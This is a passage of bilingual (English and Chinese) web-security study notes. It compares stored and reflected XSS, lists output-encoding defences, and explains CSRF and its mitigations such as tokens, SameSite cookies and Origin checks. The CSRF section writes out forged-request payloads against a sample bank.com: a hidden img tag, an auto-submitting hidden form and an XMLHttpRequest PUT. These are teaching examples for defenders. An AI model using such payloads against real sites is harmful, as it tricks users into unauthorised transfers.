Example: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL015U3BhY2UuY29t&#34;&gt;MySpace.com&lt;/span&gt; phishing attack injects a fake password field that sends password to attacker&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Stored XSS VS Reflected XSS&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stored XSS VS Reflected XSS&#34;&gt;#&lt;/a&gt;Stored XSS VS Reflected XSS&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类型&lt;/th&gt;
&lt;th&gt;存储型 XSS (Stored XSS)&lt;/th&gt;
&lt;th&gt;反射型 XSS (Reflected XSS)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;代码存储&lt;/td&gt;
&lt;td&gt;服务器端持久存储&lt;/td&gt;
&lt;td&gt;仅在请求中反射&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;持久性&lt;/td&gt;
&lt;td&gt;持久性，影响更多用户&lt;/td&gt;
&lt;td&gt;非持久性，通常只影响特定用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;攻击手段&lt;/td&gt;
&lt;td&gt;利用持久存储（如数据库、日志、文件等）&lt;/td&gt;
&lt;td&gt;通过恶意链接或表单提交诱导用户&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;示例场景&lt;/td&gt;
&lt;td&gt;评论区、论坛帖子、博客文章、用户简介等&lt;/td&gt;
&lt;td&gt;钓鱼邮件、恶意链接、搜索查询等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;修复难度&lt;/td&gt;
&lt;td&gt;难度较大，需清理服务器上的恶意代码&lt;/td&gt;
&lt;td&gt;难度较小，可通过输入验证和转义快速修复&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;Preventing XSS Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Preventing XSS Attacks&#34;&gt;#&lt;/a&gt;Preventing XSS Attacks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Input Filtering&lt;br&gt;
 还没懂先放个链接在这&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA==&#34;&gt; XSS Filter Evasion Cheat Sheet&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;Framework validation&lt;/li&gt;
&lt;li&gt;Output Sanitisation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Any user input and client-side data must be preprocessed before it is used inside HTML
&lt;ul&gt;
&lt;li&gt;PHP:  &lt;code&gt;htmlspecialchars(string)&lt;/code&gt;  replaces all special characters with their HTML code 例如，将  &lt;code&gt;&amp;lt;&lt;/code&gt;  转换为  &lt;code&gt;&amp;amp;lt;&lt;/code&gt; ， &lt;code&gt;&amp;gt;&lt;/code&gt;  转换为  &lt;code&gt;&amp;amp;gt;&lt;/code&gt; ，以防止这些字符被浏览器解释为 HTML 或脚本标签。&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0FTUC5ORVQ=&#34;&gt;ASP.NET&lt;/span&gt;:  &lt;code&gt;Server.HtmlEncode(string)&lt;/code&gt;  该方法会将字符串中的特殊字符转换为 HTML 实体，确保浏览器不会将其解释为可执行代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;过滤可能会将输入转换成攻击形式
&lt;ul&gt;
&lt;li&gt;如果预处理过程中未彻底消除所有潜在威胁，有可能仍会导致 XSS 等攻击。&lt;/li&gt;
&lt;li&gt;需要在过滤后多次循环检查，并在检测到恶意内容时重新应用过滤，直到不再发现潜在威胁为止。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Cross-Site Request Forgery&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Cross-Site Request Forgery&#34;&gt;#&lt;/a&gt;Cross-Site Request Forgery&lt;/h1&gt;
&lt;h2 id=&#34;CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#CSRF&#34;&gt;#&lt;/a&gt;CSRF&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Cross-Site Request Forgery (CSRF)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A privileged user is tricked to perform an operation on the behalf of an attacker
&lt;ul&gt;
&lt;li&gt;Often through social engineering (such as sending a link via email or chat)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Usually unnoticed by the victim user
&lt;ul&gt;
&lt;li&gt;Requests are sent by the browser behind the scenes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSRF exploits the trust that a web site has in a user’s browser
&lt;ul&gt;
&lt;li&gt;XSS exploits the trust a user has for a particular site&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Characteristics of CSRF&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Web sites rely on a user’s identity&lt;/li&gt;
&lt;li&gt;The site has trust in that identity&lt;/li&gt;
&lt;li&gt;The user’s browser is tricked into sending HTTP requests to a target site&lt;/li&gt;
&lt;li&gt;Such HTTP requests have side effects
&lt;ul&gt;
&lt;li&gt;Because the attacker doesn’t receive the response&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Example&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Example&#34;&gt;#&lt;/a&gt;Example&lt;/h2&gt;
Example Description：
Alice wishes to transfer $100 to Bob using the bank.com web application that is vulnerable to CSRF. Charlie, an attacker, wants to trick Alice into sending the money to Charlie instead. The attack will comprise the following steps: 
&lt;ul&gt;
&lt;li&gt;Build an exploit URL or script&lt;/li&gt;
&lt;li&gt;Trick Alice into executing the action with social engineering&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Example: GET&lt;br&gt;
A GET request from Alice to transfer money to Bob&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable constant_&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;BOB&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;HTTP&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Charlie first forges the following exploit URL&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;http:&lt;/span&gt;/&lt;span class=&#34;regexp&#34;&gt;/bank.com/transfer&lt;/span&gt;.&lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;?acct=&lt;span class=&#34;variable constant_&#34;&gt;CHARLIE&lt;/span&gt;&amp;amp;amount=&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Then, Charlie tricks Alice into loading this URL &lt;strong&gt;when Alice is logged into the bank&lt;/strong&gt; 例如通过发送恶意电子邮件或在其他网站上种植恶意链接。&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;查看我的图片！&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;width&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;height&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Example: POST&lt;br&gt;
A POST request from Alice to transfer money to Bob&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;POST&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; acct=BOB&amp;amp;amount=100&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Charlie first crafts some hidden FORM tags&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;100000&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;查看我的图片！&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Then, Charlie tricks Alice to click on the submit button&lt;br&gt;
Can also be executed automatically using JavaScript&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;document.forms[0].submit()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Example: Other HTTP Methods&lt;br&gt;
Charlie can use HTTP PUT method that takes a JSON object as an argument&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;PUT&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;http://bank.com/transfer.do&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;acct&amp;quot;: &amp;quot;CHARLIE&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;quot;amount&amp;quot;: 100000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Such requests can be executed with JavaScript&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;put&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; x = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;XMLHttpRequest&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;PUT&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;http://bank.com/transfer.do&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;setRequestHeader&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    x.&lt;span class=&#34;title function_&#34;&gt;send&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;JSON&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;stringify&lt;/span&gt;(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;acct&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;CHARLIE&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;&amp;#125;));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt; &lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;Prevention CSRF&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Prevention CSRF&#34;&gt;#&lt;/a&gt;Prevention CSRF&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Prevention Methods That Do Not Work
&lt;ol&gt;
&lt;li&gt;使用 “秘密” Cookie  (Using a secret cookie) ：在请求中加入一个 “秘密” Cookie，用来验证请求的合法性。&lt;br&gt;
所有 Cookie 都会在每个请求中被自动发送，无论是合法请求还是伪造请求。因此，攻击者可以利用受害者的浏览器自动发送这些 Cookie。&lt;/li&gt;
&lt;li&gt;仅接受 POST 请求 (Only accepting POST requests) ：限制仅接受 POST 请求来提交敏感操作的数据。&lt;br&gt;
攻击者仍然可以通过 HTML 表单、AJAX 请求或自动提交脚本，诱导受害者提交伪造的 POST 请求。因此，仅使用 POST 请求并不能完全防止 CSRF。&lt;/li&gt;
&lt;li&gt;多步事务处理 (Multi-step transactions) ：将操作分解为多个步骤，并在每一步中进行用户确认。：&lt;br&gt;
攻击者可能通过观察或猜测，预测每一步的结果，并模拟完整的事务流程。如果没有额外的保护机制（如 CSRF 令牌），多步流程仍然易受 CSRF 攻击。&lt;/li&gt;
&lt;li&gt;URL 重写 (URL Rewriting)： 在 URL 中包含用户的会话 ID 以维护状态。&lt;br&gt;
将会话 ID 暴露在 URL 中，会增加被截获或泄露的风险。攻击者可能会通过网络流量分析、代理日志、浏览器历史记录等方式获取会话 ID。&lt;/li&gt;
&lt;li&gt;HTTPS：使用 HTTPS 来加密通信内容。&lt;br&gt;
HTTPS 只能加密传输的内容，不能防止伪造的请求。攻击者仍可以通过受害者的浏览器发送有效的 CSRF 攻击请求，哪怕是 HTTPS 加密的请求。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Prevent CSRF: Token-based mitigation&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;A CSRF token is a unique, secret, unpredictable value
&lt;ul&gt;
&lt;li&gt;Generated by web applications and included on their own web pages&lt;br&gt;
 &lt;code&gt;http://bank.com/transfer.do?acct=CHARLIE&amp;amp;amount=100000&amp;amp;token=31415926535&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web applications reject requests if the token is missing or invalid
&lt;ul&gt;
&lt;li&gt;Impossible for an attacker to guess the token and construct a fully valid HTTP request&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Types of CSRF tokens
&lt;ul&gt;
&lt;li&gt;Synchroniser token 同步令牌：
&lt;ul&gt;
&lt;li&gt;服务端为每个会话生成一个唯一的令牌，并在请求中验证该令牌。&lt;/li&gt;
&lt;li&gt;典型的做法是在表单中嵌入一个隐藏字段，或在 URL 中附加该令牌。&lt;/li&gt;
&lt;li&gt;缺点是需要在服务端保存和管理令牌。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;encryption-based token 加密令牌：
&lt;ul&gt;
&lt;li&gt;使用加密算法将用户信息和时间戳加密，生成唯一的令牌。&lt;/li&gt;
&lt;li&gt;这种令牌不需要服务端存储，因为它可以通过解密来验证请求的有效性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hash-based token 哈希令牌：
&lt;ul&gt;
&lt;li&gt;使用用户会话信息、请求参数等作为输入，生成一个哈希值作为令牌。&lt;/li&gt;
&lt;li&gt;通常通过加盐（salt）来增加令牌的复杂性和不可预测性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Prevent CSRF: Defence-in-depth techniques&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;SameSite Cookie Attribute
&lt;ul&gt;
&lt;li&gt;Prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts&lt;/li&gt;
&lt;li&gt;如何防护：设置 &lt;code&gt;SameSite&lt;/code&gt;  属性为 &lt;code&gt;Strict&lt;/code&gt;  或 &lt;code&gt;Lax&lt;/code&gt; ，防止浏览器在跨站浏览环境中发送 Cookie，从而阻止 CSRF 攻击。&lt;br&gt;
 &lt;code&gt;SameSite=Strict&lt;/code&gt; ：Cookie 仅在同一站点请求时发送，完全阻止跨站请求。&lt;br&gt;
 &lt;code&gt;SameSite=Lax&lt;/code&gt; ：Cookie 允许在少数跨站请求中发送（如 GET 请求或导航），但会限制大多数情况下的跨站请求&lt;/li&gt;
&lt;li&gt;示例：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;attribute&#34;&gt;Set-Cookie&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;: &lt;/span&gt;sessionId=abc123; SameSite=Strict;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Verifying Origin With Standard Headers
&lt;ul&gt;
&lt;li&gt;Determine and match both the source and target of a request&lt;/li&gt;
&lt;li&gt;如何防护：Web 应用服务器检查请求的 Origin 或 Referer 头，并确保它们与应用的域匹配。&lt;br&gt;
仅允许来自可信域的请求进行处理。&lt;/li&gt;
&lt;li&gt;示例：对于银行转账请求，服务器将确保请求的来源为 &lt;code&gt;https://bank.com&lt;/code&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
